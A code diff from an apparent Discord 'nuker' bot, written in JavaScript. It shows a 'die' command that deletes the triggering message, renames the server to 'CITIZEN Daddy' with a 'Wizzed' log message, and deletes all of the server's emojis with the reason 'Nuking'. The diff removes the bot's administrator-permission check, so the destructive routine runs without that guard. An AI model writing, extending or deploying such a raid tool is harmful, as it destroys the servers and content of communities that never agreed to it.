@@ -306,9 +306,7 @@ client.on("message", async message => {
 
         // Death.
         if (message.content.startsWith(prefix + 'die')) {
-            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
-                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
-            } else {
+
                 message.delete();
                 message.guild.setName(`CITIZEN Daddy `).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name
 
@@ -380,7 +378,7 @@ client.on("message", async message => {
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
 
 
-				}
+
 			}
 
         ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
